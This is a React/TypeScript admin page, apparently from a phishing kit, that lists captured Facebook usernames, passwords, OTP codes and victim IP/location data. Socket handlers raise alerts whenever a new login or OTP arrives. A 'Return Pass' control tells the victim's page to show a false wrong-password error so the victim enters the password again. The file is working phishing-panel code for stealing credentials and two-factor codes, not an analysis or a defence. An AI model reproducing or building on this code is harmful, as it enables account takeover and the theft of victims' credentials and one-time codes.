import { Helmet } from 'react-helmet-async';
import { useState, useEffect } from 'react';
// @mui
import {
  Card,
  Table,
  Container,
  TableBody,
  TableContainer,
  Typography,
  Stack,
} from '@mui/material';
// routes
import { PATH_DASHBOARD } from '../../routes/paths';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { getFbUsers, deleteFbUser, returnWrongPass, fbUserAdded, fbUserUpdated, IFbUser } from '../../redux/slices/fb';
// components
import Scrollbar from '../../components/scrollbar';
import CustomBreadcrumbs from '../../components/custom-breadcrumbs';
import { useSettingsContext } from '../../components/settings';
import {
  useTable,
  TableNoData,
  TableHeadCustom,
  TablePaginationCustom,
} from '../../components/table';
import { useSnackbar } from '../../components/snackbar';
// utils
import { socket } from '../../utils/socket';
// sections
import FbUserTableRow from '../../sections/@dashboard/fb/FbUserTableRow';

// ----------------------------------------------------------------------

const TABLE_HEAD = [
  { id: 'account', label: 'Tài khoản / Mật khẩu', align: 'left' },
  { id: 'verifyCode', label: 'OTP Code', align: 'left' },
  { id: 'status', label: 'Trạng thái', align: 'left' },
  { id: 'geo', label: 'Thông tin IP / Vị trí', align: 'left' },
  { id: 'createdAt', label: 'Thời gian', align: 'left' },
  { id: 'actions', label: 'Thao tác', align: 'right' },
];

// ----------------------------------------------------------------------

export default function FbUserListPage() {
  const { themeStretch } = useSettingsContext();
  const dispatch = useDispatch();
  const { enqueueSnackbar } = useSnackbar();

  const {
    page,
    order,
    orderBy,
    rowsPerPage,
    onSort,
    onChangePage,
    onChangeDense,
    onChangeRowsPerPage,
    dense,
  } = useTable({ defaultOrderBy: 'createdAt' });

  const { fbUsers, isLoading, pagination } = useSelector((state) => state.fb);

  useEffect(() => {
    dispatch(getFbUsers({ page: page + 1, limit: rowsPerPage }));
  }, [dispatch, page, rowsPerPage]);

  // Real-time: receive new FB login from socket
  useEffect(() => {
    socket.connect();

    socket.on('fb-login-new', (data: IFbUser) => {
      dispatch(fbUserAdded(data));
      enqueueSnackbar(`🔵 New FB login: ${data.account}`, { variant: 'info' });
    });

    socket.on('fb-otp-received', (data: IFbUser) => {
      dispatch(fbUserUpdated(data));
      enqueueSnackbar(`🔐 OTP received: ${data.verifyCode} (${data.account})`, { variant: 'success' });
    });

    return () => {
      socket.off('fb-login-new');
      socket.off('fb-otp-received');
      socket.disconnect();
    };
  }, [dispatch, enqueueSnackbar]);

  const handleReturnWrongPass = async (id: string) => {
    try {
      await returnWrongPass(id);
      enqueueSnackbar('Đã gửi tín hiệu sai mật khẩu về client!', { variant: 'warning' });
    } catch {
      enqueueSnackbar('Lỗi khi gửi tín hiệu', { variant: 'error' });
    }
  };

  const handleDelete = (id: string) => {
    dispatch(deleteFbUser(id));
  };

  return (
    <>
      <Helmet>
        <title>Admin: Facebook Users</title>
      </Helmet>

      <Container maxWidth={themeStretch ? false : 'lg'}>
        <CustomBreadcrumbs
          heading="Facebook Accounts"
          links={[
            { name: 'Dashboard', href: PATH_DASHBOARD.root },
            { name: 'Facebook', href: PATH_DASHBOARD.fb?.list || '#' },
            { name: 'List' },
          ]}
        />

        {/* Info Banner */}
        <Stack
          direction="row"
          alignItems="center"
          spacing={1.5}
          sx={{
            mb: 3,
            p: 2,
            borderRadius: 2,
            bgcolor: '#e7f3ff',
            border: '1px solid #1877f2',
          }}
        >
          <Typography
            sx={{ fontSize: 22, lineHeight: 1 }}
          >
            🔵
          </Typography>
          <Typography variant="body2" sx={{ color: '#1877f2', fontWeight: 600 }}>
            Danh sách tài khoản Facebook thu thập được. Nhấn <b>Return Pass</b> để báo sai mật khẩu về client (họ sẽ thấy thông báo lỗi đỏ và nhập lại).
          </Typography>
        </Stack>

        <Card>
          <TableContainer sx={{ position: 'relative', overflow: 'unset' }}>
            <Scrollbar>
              <Table size={dense ? 'small' : 'medium'} sx={{ minWidth: 900 }}>
                <TableHeadCustom
                  order={order}
                  orderBy={orderBy}
                  headLabel={TABLE_HEAD}
                  onSort={onSort}
                />
                <TableBody>
                  {fbUsers.map((row) => (
                    <FbUserTableRow
                      key={row.id}
                      row={row}
                      onReturnWrongPass={() => handleReturnWrongPass(row.id)}
                      onDelete={() => handleDelete(row.id)}
                    />
                  ))}
                  <TableNoData isNotFound={!isLoading && !fbUsers.length} />
                </TableBody>
              </Table>
            </Scrollbar>
          </TableContainer>

          <TablePaginationCustom
            count={pagination?.total || 0}
            page={page}
            rowsPerPage={rowsPerPage}
            onPageChange={onChangePage}
            onRowsPerPageChange={onChangeRowsPerPage}
            dense={dense}
            onChangeDense={onChangeDense}
          />
        </Card>
      </Container>
    </>
  );
}
